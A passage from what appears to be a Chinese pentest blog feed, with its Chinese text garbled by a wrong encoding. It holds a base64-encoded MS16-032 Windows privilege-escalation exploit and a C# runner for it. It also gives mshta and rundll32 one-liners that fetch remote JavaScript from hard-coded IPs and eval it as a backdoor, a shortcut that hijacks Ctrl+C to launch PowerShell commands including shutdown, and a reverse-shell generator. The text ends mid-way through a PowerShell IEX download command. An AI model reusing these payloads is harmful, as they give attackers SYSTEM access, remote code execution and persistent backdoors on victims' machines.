BoT2JqZWN0KTsKICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBEdXBsaWNhdGVIYW5kbGUoCiAgICAgICAgICAgIEludFB0ciBoU291cmNlUHJvY2Vzc0hhbmRsZSwKICAgICAgICAgICAgSW50UHRyIGhTb3VyY2VIYW5kbGUsCiAgICAgICAgICAgIEludFB0ciBoVGFyZ2V0UHJvY2Vzc0hhbmRsZSwKICAgICAgICAgICAgcmVmIEludFB0ciBscFRhcmdldEhhbmRsZSwKICAgICAgICAgICAgaW50IGR3RGVzaXJlZEFjY2VzcywKICAgICAgICAgICAgYm9vbCBiSW5oZXJpdEhhbmRsZSwKICAgICAgICAgICAgaW50IGR3T3B0aW9ucyk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgTnRkbGwKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IE50SW1wZXJzb25hdGVUaHJlYWQoCiAgICAgICAgICAgIEludFB0ciBUaHJlYWRIYW5kbGUsCiAgICAgICAgICAgIEludFB0ciBUaHJlYWRUb0ltcGVyc29uYXRlLAogICAgICAgICAgICByZWYgU1FPUyBTZWN1cml0eVF1YWxpdHlPZlNlcnZpY2UpOwogICAgfQoiQAoKICAgIGZ1bmN0aW9uIEdldC1UaHJlYWRIYW5kbGUgewogICAgICAgICMgU3RhcnR1cEluZm8gU3RydWN0CiAgICAgICAgJFN0YXJ0dXBJbmZvID0gTmV3LU9iamVjdCBTVEFSVFVQSU5GTwogICAgICAgICRTdGFydHVwSW5mby5kd0ZsYWdzID0gMHgwMDAwMDEwMSAjIFNUQVJURl9VU0VTVERIQU5ETEVTCiAgICAgICAgICAgICRTdGFydHVwSW5mby53U2hvd1dpbmRvdyA9IDA7CiAgICAgICAgJFN0YXJ0dXBJbmZvLmhTdGRJbnB1dCA9IFtLZXJuZWwzMl06OkdldEN1cnJlbnRUaHJlYWQoKQogICAgICAgICRTdGFydHVwSW5mby5oU3RkT3V0cHV0ID0gW0tlcm5lbDMyXTo6R2V0Q3VycmVudFRocmVhZCgpCiAgICAgICAgJFN0YXJ0dXBJbmZvLmhTdGRFcnJvciA9IFtLZXJuZWwzMl06OkdldEN1cnJlbnRUaHJlYWQoKQogICAgICAgICRTdGFydHVwSW5mby5jYiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZigkU3RhcnR1cEluZm8pICMgU3RydWN0IFNpemUKICAgICAgICAKICAgICAgICAjIFByb2Nlc3NJbmZvIFN0cnVjdAogICAgICAgICRQcm9jZXNzSW5mbyA9IE5ldy1PYmplY3QgUFJPQ0VTU19JTkZPUk1BVElPTgogICAgICAgIAogICAgICAgICMgQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcgLS0+IGxwQ3VycmVudERpcmVjdG9yeQogICAgICAgICRHZXRDdXJyZW50UGF0aCA9IChHZXQtSXRlbSAtUGF0aCAiLlwiIC1WZXJib3NlKS5GdWxsTmFtZQogICAgICAgIAogICAgICAgICMgTE9HT05fTkVUQ1JFREVOVElBTFNfT05MWSAvIENSRUFURV9TVVNQRU5ERUQKICAgICAgICAkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OkNyZWF0ZVByb2Nlc3NXaXRoTG9nb25XKAogICAgICAgICAgICAidXNlciIsICJkb21haW4iLCAicGFzcyIsCiAgICAgICAgICAgIDB4MDAwMDAwMDIsICJDOlxXaW5kb3dzXFN5c3RlbTMyXG5vdGVwYWQuZXhlIiwgIiIsCiAgICAgICAgICAgIDB4MDAwMDAwMDQsICRudWxsLCAkR2V0Q3VycmVudFBhdGgsCiAgICAgICAgICAgIFtyZWZdJFN0YXJ0dXBJbmZvLCBbcmVmXSRQcm9jZXNzSW5mbykKICAgICAgICAKICAgICAgICAjIER1cGxpY2F0ZSBoYW5kbGUgaW50byBjdXJyZW50IHByb2Nlc3MgLT4gRFVQTElDQVRFX1NBTUVfQUNDRVNTCiAgICAgICAgJGxwVGFyZ2V0SGFuZGxlID0gW0ludFB0cl06Olplcm8KICAgICAgICAkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OkR1cGxpY2F0ZUhhbmRsZSgKICAgICAgICAgICAgJFByb2Nlc3NJbmZvLmhQcm9jZXNzLCAweDQsCiAgICAgICAgICAgIFtLZXJuZWwzMl06OkdldEN1cnJlbnRQcm9jZXNzKCksCiAgICAgICAgICAgIFtyZWZdJGxwVGFyZ2V0SGFuZGxlLCAwLCAkZmFsc2UsCiAgICAgICAgICAgIDB4MDAwMDAwMDIpCiAgICAgICAgCiAgICAgICAgIyBDbGVhbiB1cCBzdXNwZW5kZWQgcHJvY2VzcwogICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6VGVybWluYXRlUHJvY2VzcygkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDEpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFByb2Nlc3MpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFRocmVhZCkKICAgICAgICAKICAgICAgICAkbHBUYXJnZXRIYW5kbGUKICAgIH0KICAgIAogICAgZnVuY3Rpb24gR2V0LVN5c3RlbVRva2VuIHsKICAgICAgICBlY2hvICJgbls/XSBUcnlpbmcgdGhyZWFkIGhhbmRsZTogJFRocmVhZCIKICAgICAgICBlY2hvICJbP10gVGhyZWFkIGJlbG9uZ3MgdG86ICQoJChHZXQtUHJvY2VzcyAtUElEICQoW0tlcm5lbDMyXTo6R2V0UHJvY2Vzc0lkT2ZUaHJlYWQoJFRocmVhZCkpKS5Qcm9jZXNzTmFtZSkiCiAgICAKICAgICAgICAkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OlN1c3BlbmRUaHJlYWQoJFRocmVhZCkKICAgICAgICBpZiAoJENhbGxSZXN1bHQgLW5lIDApIHsKICAgICAgICAgICAgZWNobyAiWyFdICRUaHJlYWQgaXMgYSBiYWQgdGhyZWFkLCBtb3Zpbmcgb24uLiIKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfSBlY2hvICJbK10gVGhyZWFkIHN1c3BlbmRlZCIKICAgICAgICAKICAgICAgICBlY2hvICJbPl0gV2lwaW5nIGN1cnJlbnQgaW1wZXJzb25hdGlvbiB0b2tlbiIKICAgICAgICAkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OlNldFRocmVhZFRva2VuKFtyZWZdJFRocmVhZCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgaWYgKCEkQ2FsbFJlc3VsdCkgewogICAgICAgICAgICBlY2hvICJbIV0gU2V0VGhyZWFkVG9rZW4gZmFpbGVkLCBtb3Zpbmcgb24uLiIKICAgICAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKICAgICAgICAgICAgZWNobyAiWytdIFRocmVhZCByZXN1bWVkISIKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGVjaG8gIls+XSBCdWlsZGluZyBTWVNURU0gaW1wZXJzb25hdGlvbiB0b2tlbiIKICAgICAgICAjIFNlY3VyaXR5UXVhbGl0eU9mU2VydmljZSBzdHJ1Y3QKICAgICAgICAkU1FPUyA9IE5ldy1PYmplY3QgU1FPUwogICAgICAgICRTUU9TLkltcGVyc29uYXRpb25MZXZlbCA9IDIgI1NlY3VyaXR5SW1wZXJzb25hdGlvbgogICAgICAgICRTUU9TLkxlbmd0aCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZigkU1FPUykKICAgICAgICAjIFVuZG9jdW1lbnRlZCBBUEkncywgSSBsaWtlIHlvdXIgc3R5bGUgTWljcm9zb2Z0IDspCiAgICAgICAgJENhbGxSZXN1bHQgPSBbTnRkbGxdOjpOdEltcGVyc29uYXRlVGhyZWFkKCRUaHJlYWQsICRUaHJlYWQsIFtyZWZdJHNxb3MpCiAgICAgICAgaWYgKCRDYWxsUmVzdWx0IC1uZSAwKSB7CiAgICAgICAgICAgIGVjaG8gIlshXSBOdEltcGVyc29uYXRlVGhyZWFkIGZhaWxlZCwgbW92aW5nIG9uLi4iCiAgICAgICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6UmVzdW1lVGhyZWFkKCRUaHJlYWQpCiAgICAgICAgICAgIGVjaG8gIlsrXSBUaHJlYWQgcmVzdW1lZCEiCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgIAogICAgICAgICRzY3JpcHQ6U3lzVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICMgMHgwMDA2IC0tPiBUT0tFTl9EVVBMSUNBVEUgLWJvciBUT0tFTl9JTVBFUlNPTkFURQogICAgICAgICRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6T3BlblRocmVhZFRva2VuKCRUaHJlYWQsIDB4MDAwNiwgJGZhbHNlLCBbcmVmXSRTeXNUb2tlbkhhbmRsZSkKICAgICAgICBpZiAoISRDYWxsUmVzdWx0KSB7CiAgICAgICAgICAgIGVjaG8gIlshXSBPcGVuVGhyZWFkVG9rZW4gZmFpbGVkLCBtb3Zpbmcgb24uLiIKICAgICAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKICAgICAgICAgICAgZWNobyAiWytdIFRocmVhZCByZXN1bWVkISIKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGVjaG8gIls/XSBTdWNjZXNzLCBvcGVuIFNZU1RFTSB0b2tlbiBoYW5kbGU6ICRTeXNUb2tlbkhhbmRsZSIKICAgICAgICBlY2hvICJbK10gUmVzdW1pbmcgdGhyZWFkLi4iCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKICAgIH0KICAgIAogICAgIyBtYWluKCkgPC0tLSA7KQogICAgJG1zMTYwMzIgPSBAIgogICAgIF9fIF9fIF9fXyBfX18gICBfX18gICAgIF9fXyBfX18gX19fIAogICAgfCAgViAgfCAgX3xfICB8IHwgIF98X19ffCAgIHxfICB8XyAgfAogICAgfCAgICAgfF8gIHxffCB8X3wgLiB8X19ffCB8IHxfICB8ICBffAogICAgfF98X3xffF9fX3xfX19fX3xfX198ICAgfF9fX3xfX198X19ffAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICBbYnkgYjMzZiAtPiBARnV6enlTZWNdCiJACiAgICAKICAgICRtczE2MDMyCiAgICAKICAgICMgQ2hlY2sgbG9naWNhbCBwcm9jZXNzb3IgY291bnQsIHJhY2UgY29uZGl0aW9uIHJlcXVpcmVzIDIrCiAgICBlY2hvICJgbls/XSBPcGVyYXRpbmcgc3lzdGVtIGNvcmUgY291bnQ6ICQoW1N5c3RlbS5FbnZpcm9ubWVudF06OlByb2Nlc3NvckNvdW50KSIKICAgIGlmICgkKFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpQcm9jZXNzb3JDb3VudCkgLWx0IDIpIHsKICAgICAgICBlY2hvICJbIV0gVGhpcyBpcyBhIFZNIGlzbid0IGl0LCByYWNlIGNvbmRpdGlvbiByZXF1aXJlcyBhdCBsZWFzdCAyIENQVSBjb3JlcywgZXhpdGluZyFgbiIKICAgICAgICBSZXR1cm4KICAgIH0KICAgIAogICAgIyBDcmVhdGUgYXJyYXkgZm9yIFRocmVhZHMgJiBUSUQncwogICAgJFRocmVhZEFycmF5ID0gQCgpCiAgICAkVGlkQXJyYXkgPSBAKCkKICAgIAogICAgZWNobyAiWz5dIER1cGxpY2F0aW5nIENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XIGhhbmRsZXMuLiIKICAgICMgTG9vcCBHZXQtVGhyZWFkSGFuZGxlIGFuZCBjb2xsZWN0IHRocmVhZCBoYW5kbGVzIHdpdGggYSB2YWxpZCBUSUQKICAgIGZvciAoJGk9MDsgJGkgLWx0IDUwMDsgJGkrKykgewogICAgICAgICRoVGhyZWFkID0gR2V0LVRocmVhZEhhbmRsZQogICAgICAgICRoVGhyZWFkSUQgPSBbS2VybmVsMzJdOjpHZXRUaHJlYWRJZCgkaFRocmVhZCkKICAgICAgICAjIEJpdCBoYWNreS9sYXp5LCBmaWx0ZXJzIG9uIHVuaXEvdmFsaWQgVElEJ3MgdG8gY3JlYXRlICRUaHJlYWRBcnJheQogICAgICAgIGlmICgkVGlkQXJyYXkgLW5vdGNvbnRhaW5zICRoVGhyZWFkSUQpIHsKICAgICAgICAgICAgJFRpZEFycmF5ICs9ICRoVGhyZWFkSUQKICAgICAgICAgICAgaWYgKCRoVGhyZWFkIC1uZSAwKSB7CiAgICAgICAgICAgICAgICAkVGhyZWFkQXJyYXkgKz0gJGhUaHJlYWQgIyBUaGlzIGlzIHdoYXQgd2UgbmVlZCEKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIAogICAgaWYgKCQoJFRocmVhZEFycmF5Lmxlbmd0aCkgLWVxIDApIHsKICAgICAgICBlY2hvICJbIV0gTm8gdmFsaWQgdGhyZWFkIGhhbmRsZXMgd2VyZSBjYXB0dXJlZCwgZXhpdGluZyEiCiAgICAgICAgUmV0dXJuCiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIls/XSBEb25lLCBnb3QgJCgkVGhyZWFkQXJyYXkubGVuZ3RoKSB0aHJlYWQgaGFuZGxlKHMpISIKICAgICAgICBlY2hvICJgbls/XSBUaHJlYWQgaGFuZGxlIGxpc3Q6IgogICAgICAgICRUaHJlYWRBcnJheQogICAgfQogICAgCiAgICBlY2hvICJgblsqXSBTbmlmZmluZyBvdXQgcHJpdmlsZWdlZCBpbXBlcnNvbmF0aW9uIHRva2VuLi4iCiAgICBmb3JlYWNoICgkVGhyZWFkIGluICRUaHJlYWRBcnJheSl7CiAgICAKICAgICAgICAjIEdldCBoYW5kbGUgdG8gU1lTVEVNIGFjY2VzcyB0b2tlbgogICAgICAgIEdldC1TeXN0ZW1Ub2tlbgogICAgICAgIAogICAgICAgIGVjaG8gImBuWypdIFNuaWZmaW5nIG91dCBTWVNURU0gc2hlbGwuLiIKICAgICAgICBlY2hvICJgbls+XSBEdXBsaWNhdGluZyBTWVNURU0gdG9rZW4iCiAgICAgICAgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgJENhbGxSZXN1bHQgPSBbQWR2YXBpMzJdOjpEdXBsaWNhdGVUb2tlbigkU3lzVG9rZW5IYW5kbGUsIDIsIFtyZWZdJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKICAgICAgICAKICAgICAgICAjIFNpbXBsZSBQUyBydW5zcGFjZSBkZWZpbml0aW9uCiAgICAgICAgZWNobyAiWz5dIFN0YXJ0aW5nIHRva2VuIHJhY2UiCiAgICAgICAgJFJ1bnNwYWNlID0gW3J1bnNwYWNlZmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlKCkKICAgICAgICAkU3RhcnRUb2tlblJhY2UgPSBbcG93ZXJzaGVsbF06OkNyZWF0ZSgpCiAgICAgICAgJFN0YXJ0VG9rZW5SYWNlLnJ1bnNwYWNlID0gJFJ1bnNwYWNlCiAgICAgICAgJFJ1bnNwYWNlLk9wZW4oKQogICAgICAgIFt2b2lkXSRTdGFydFRva2VuUmFjZS5BZGRTY3JpcHQoewogICAgICAgICAgICBQYXJhbSAoJFRocmVhZCwgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKICAgICAgICAgICAgd2hpbGUgKCR0cnVlKSB7CiAgICAgICAgICAgICAgICAkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OlNldFRocmVhZFRva2VuKFtyZWZdJFRocmVhZCwgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKICAgICAgICAgICAgfQogICAgICAgIH0pLkFkZEFyZ3VtZW50KCRUaHJlYWQpLkFkZEFyZ3VtZW50KCRoRHVwbGljYXRlVG9rZW5IYW5kbGUpCiAgICAgICAgJEFzY09iaiA9ICRTdGFydFRva2VuUmFjZS5CZWdpbkludm9rZSgpCiAgICAgICAgCiAgICAgICAgZWNobyAiWz5dIFN0YXJ0aW5nIHByb2Nlc3MgcmFjZSIKICAgICAgICAjIEFkZGluZyBhIHRpbWVvdXQgKDEwIHNlY29uZHMpIGhlcmUgdG8gc2FmZWd1YXJkIGZyb20gZWRnZS1jYXNlcwogICAgICAgICRTYWZlR3VhcmQgPSBbZGlhZ25vc3RpY3Muc3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgIHdoaWxlICgkU2FmZUd1YXJkLkVsYXBzZWRNaWxsaXNlY29uZHMgLWx0IDEwMDAwKSB7CiAgICAgICAgIyBTdGFydHVwSW5mbyBTdHJ1Y3QKICAgICAgICAkU3RhcnR1cEluZm8gPSBOZXctT2JqZWN0IFNUQVJUVVBJTkZPCiAgICAgICAgJFN0YXJ0dXBJbmZvLmNiID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKCRTdGFydHVwSW5mbykgIyBTdHJ1Y3QgU2l6ZQogICAgICAgICRTdGFydHVwSW5mby5kd0ZsYWdzID0gMHgwMDAwMDEwMSAjIFNUQVJURl9VU0VTVERIQU5ETEVTCiAgICAgICAgICAgICRTdGFydHVwSW5mby53U2hvd1dpbmRvdyA9IDA7CiAgICAgICAgIyBQcm9jZXNzSW5mbyBTdHJ1Y3QKICAgICAgICAkUHJvY2Vzc0luZm8gPSBOZXctT2JqZWN0IFBST0NFU1NfSU5GT1JNQVRJT04KICAgICAgICAKICAgICAgICAjIENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XIC0tPiBscEN1cnJlbnREaXJlY3RvcnkKICAgICAgICAkR2V0Q3VycmVudFBhdGggPSAoR2V0LUl0ZW0gLVBhdGggIi5cIiAtVmVyYm9zZSkuRnVsbE5hbWUKICAgICAgICAKICAgICAgICAjIExPR09OX05FVENSRURFTlRJQUxTX09OTFkgLyBDUkVBVEVfU1VTUEVOREVECiAgICAgICAgJENhbGxSZXN1bHQgPSBbQWR2YXBpMzJdOjpDcmVhdGVQcm9jZXNzV2l0aExvZ29uVygKICAgICAgICAgICAgInVzZXIiLCAiZG9tYWluIiwgInBhc3MiLAogICAgICAgICAgICAweDAwMDAwMDAyLCAkQXBwbGljYXRpb24sJENvbW1hbmRsaW5lLAogICAgICAgICAgICAweDAwMDAwMDA0LCAkbnVsbCwgJEdldEN1cnJlbnRQYXRoLAogICAgICAgICAgICBbcmVmXSRTdGFydHVwSW5mbywgW3JlZl0kUHJvY2Vzc0luZm8pCiAgICAgICAgICAgIAogICAgICAgICRoVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6T3BlblByb2Nlc3NUb2tlbigkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDB4MjgsIFtyZWZdJGhUb2tlbkhhbmRsZSkKICAgICAgICAjIElmIHdlIGNhbid0IG9wZW4gdGhlIHByb2Nlc3MgdG9rZW4gaXQncyBhIFNZU1RFTSBzaGVsbCEKICAgICAgICBpZiAoISRDYWxsUmVzdWx0KSB7CiAgICAgICAgICAgIGVjaG8gIlshXSBIb2x5IGhhbmRsZSBsZWFrIEJhdG1hbiwgd2UgaGF2ZSBhIFNZU1RFTSBzaGVsbCEhYG4iCiAgICAgICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6UmVzdW1lVGhyZWFkKCRQcm9jZXNzSW5mby5oVGhyZWFkKQogICAgICAgICAgICAkU3RhcnRUb2tlblJhY2UuU3RvcCgpCiAgICAgICAgICAgICRTYWZlR3VhcmQuU3RvcCgpCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgIyBDbGVhbiB1cCBzdXNwZW5kZWQgcHJvY2VzcwogICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6VGVybWluYXRlUHJvY2VzcygkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDEpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFByb2Nlc3MpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFRocmVhZCkKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgIyBLaWxsIHJ1bnNwYWNlICYgc3RvcHdhdGNoIGlmIGVkZ2UtY2FzZQogICAgICAgICRTdGFydFRva2VuUmFjZS5TdG9wKCkKICAgICAgICAkU2FmZUd1YXJkLlN0b3AoKQogICAgfQp9")); public void ExecuteSynchronously(string aplication,string commandline) &#123; string Commandout; InitialSessionState iss = InitialSessionState.CreateDefault(); Runspace rs = RunspaceFactory.CreateRunspace(iss); rs.Open(); PowerShell ps = PowerShell.Create(); ps.Runspace = rs; ps.AddScript(PSInvoke_MS16_032); if (commandline != "") &#123; Commandout = "Invoke-MS16-032 -Application \"" + aplication + "\" -Commandline " + "\""+commandline+"\""; &#125; else&#123; Commandout = "Invoke-MS16-032 -Application " + aplication; &#125; Console.WriteLine(Commandout); ps.AddScript(Commandout); ps.AddCommand("Out-Default"); ps.Invoke(); rs.Close(); &#125; &#125;&#125; base64çš„å†…å®¹æ˜¯ https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1 çš„æ‰€æœ‰å†…å®¹çš„base64ç¼–ç ï¼ˆä½ å¯ä»¥ä½¿ç”¨ä½ è‡ªå·±çš„powershellè„šæœ¬ï¼‰ï¼Œç”±äºæˆ‘æ”¹çš„è¿™ä¸ªæ˜¯æœ‰å‚æ•°çš„ï¼Œæ‰€ä»¥ç®€å•çš„å†™äº†ä¸Šé¢çš„c#ä»£ç ï¼Œé€šè¿‡.netæ¥æ‰§è¡Œpowershellã€‚ ç¼–è¯‘éœ€è¦System.Management.Automation.dllï¼Œå…·ä½“æ­¥éª¤åœ¨csæ–‡ä»¶é‡Œé¢å·²ç»å†™äº†ï¼Œä½ ä»¬è‡ªå·±ç¼–è¯‘å§ï¼Œåªæ˜¯å¯¹æœ¬æœºè¿›è¡Œäº†æµ‹è¯•ï¼Œæ²¡æµ‹è¯•åˆ«çš„ï¼Œæµ‹è¯•Demoå¦‚ä¸‹ï¼š http://static.wooyun.org/upload/image/201606/2016063013052815262.gif é€šè¿‡.netæ¥æ‰§è¡Œpowershellï¼Œå¹¶ä¸éœ€è¦powershell.exe ã€‚è¯¦æƒ…å¯ä»¥çœ‹ä¸€ä¸‹ p0wnedShell æˆ–è€… http://zone.wooyun.org/content/26831 .net 2.0ä¸‹ç¼–è¯‘çš„ç‰ˆæœ¬åœ¨è¿™é‡Œ]]></content>
      <categories>
        <category>æ¸—é€æ¡ˆä¾‹</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Exec Commands Via Mshta.exe]]></title>
    <url>%2Farchives%2FExec_Commands_Via_Mshta.html</url>
    <content type="text"><![CDATA[çœ‹ç”¨â€œä¸–ç•Œä¸Šæœ€å¥½çš„ç¼–ç¨‹è¯­è¨€â€åˆ¶ä½œçš„æ•²è¯ˆè€…æœ¨é©¬æ­ç§˜çš„æ—¶å€™å‘ç°ï¼Œæ”»å‡»è€…ä½¿ç”¨mshtaæ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¹‹å‰æ²¡æ€ä¹ˆæ¥è§¦è¿‡ï¼ŒæŸ¥äº†æŸ¥èµ„æ–™ä¹Ÿä¸æ˜¯å¾ˆå¤šï¼Œmshtaæ˜¯ç”¨æ¥æ‰§è¡Œhtaæ–‡ä»¶çš„ï¼Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œå…¶å®æ²¡æœ‰htaæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡mshtaæ¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œç»è¿‡å‡ æ¬¡æµ‹è¯•å‘ç°mshtaä¸ä»…å¯ä»¥ä½¿ç”¨vbscriptï¼Œè€Œä¸”å¯ä»¥ä½¿ç”¨javascriptæ¥æ‰§è¡Œå‘½ä»¤ï¼Œæ•´ç†payloadå¦‚ä¸‹ï¼š VBSCRIPT EXEC1mshta vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close) JAVASCRIPT EXEC1mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);&#125; JSRAT1mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.101:9998/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);&#125; Demoå¦‚ä¸‹ï¼š ä½ çŒœçŒœè¿˜å¯ä»¥æ€ä¹ˆç©å„¿ï¼Ÿ 2333333.]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hijacking Common Windows Shortcuts with Powershell]]></title>
    <url>%2Farchives%2Fhijacking-common-windows-shortcuts-with-powershell.html</url>
    <content type="text"><![CDATA[Demo: åŠ«æŒå¿«æ·é”®ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚ Code: calc: $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&quot;desktop\desktoppayload.lnk&quot;) $Shortcut.TargetPath = &quot;%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe&quot; $Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot; $Shortcut.hotkey = &quot;ctrl+c&quot; $Shortcut.Arguments = &apos;calc&apos; $Shortcut.Save() shutdown: $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&quot;desktop\desktoppayload.lnk&quot;) $Shortcut.TargetPath = &quot;%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe&quot; $Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot; $Shortcut.hotkey = &quot;ctrl+c&quot; $Shortcut.Arguments = &apos;shutdown /s /t 0&apos; $Shortcut.Save() æ›´å¤šç©å„¿æ³•ï¼Œä½ æ¥åˆ›é€ ~]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[JavascriptåŠCOMè„šæœ¬çš„è¿›ä¸€æ­¥åˆ©ç”¨]]></title>
    <url>%2Farchives%2FJavascript_And_ComScript.html</url>
    <content type="text"><![CDATA[0x00 ä¼˜åŒ–JSRATè¿›ä¸€æ­¥ä¼˜åŒ–çš„jsratå¯åŠ¨ä»£ç ï¼š1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try&#123;v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");try&#123;q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);&#125;catch(e)&#123;h.SetProxy(2,v);&#125;&#125;finally&#123;h.Open("GET","http://54.93.72.226:8080/connect",false);h.Send();B=h.ResponseText;eval(B)&#125; å½“å®¢æˆ·ç«¯å­˜åœ¨ä»£ç†çš„æ—¶å€™ï¼Œé€šè¿‡ä»£ç†æ¥è¿›è¡Œé“¾æ¥ã€‚ å¤šäº†æ³¨å†Œè¡¨å…³é”®å­—ï¼Œå®¹æ˜“è¢«æ€ï¼Œå¯ä»¥ä½¿ç”¨WSCæ–¹å¼æ¥å¯åŠ¨ï¼Œå°†ä»£ç å†™åˆ°è¿œç¨‹æ–‡ä»¶ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://url/script") 0x01 å¦‚ä½•ä¼˜é›…çš„ç”ŸæˆRundll32ä»£ç nishangä½œè€…å†™äº†ä¸€ä¸ªè„šæœ¬Out-RundllCommandï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„ç”Ÿæˆä»£ç ã€‚ å¦‚æœæƒ³å¼¹ä¸€ä¸ªpowershellçš„shellï¼Œå¯ä»¥è¿™æ ·æ¥ç”Ÿæˆï¼š1Out-RundllCommand -Reverse -IPAddress 192.168.230.1 -Port 443 æˆ–è€…ç›´æ¥è¿™æ ·ï¼š1powershell -nop -exec bypass -c "IEX (New-Object 